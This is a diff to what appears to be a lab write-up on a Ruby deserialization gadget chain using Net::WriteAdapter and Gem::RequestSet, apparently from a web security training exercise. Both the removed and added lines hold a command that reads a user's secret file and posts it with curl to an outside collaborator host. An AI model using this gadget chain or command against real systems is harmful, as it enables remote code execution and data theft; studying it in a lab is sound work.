@@ -4,6 +4,8 @@ We create a container with Ruby version 2.7 or lower.
 
 ```
 docker run -it --rm ruby:2.7 bash
+apt update
+apt install nano
 ```
 
 
@@ -26,7 +28,7 @@ wa1 = Net::WriteAdapter.new(Kernel, :system)
 
 rs = Gem::RequestSet.allocate
 rs.instance_variable_set('@sets', wa1)
-rs.instance_variable_set('@git_set', "cat /home/carlos/secret.txt | curl -X POST --data-binary @- http://rlgw2jqyghfnkaqal52bjqcsbjhb54tt.oastify.com")   # change for command desired
+rs.instance_variable_set('@git_set', "cat /home/carlos/secret | curl -X POST --data-binary @- http://<BURP-COLAB>/?hii")   # change for command desired
 
 wa2 = Net::WriteAdapter.new(rs, :resolve)
 
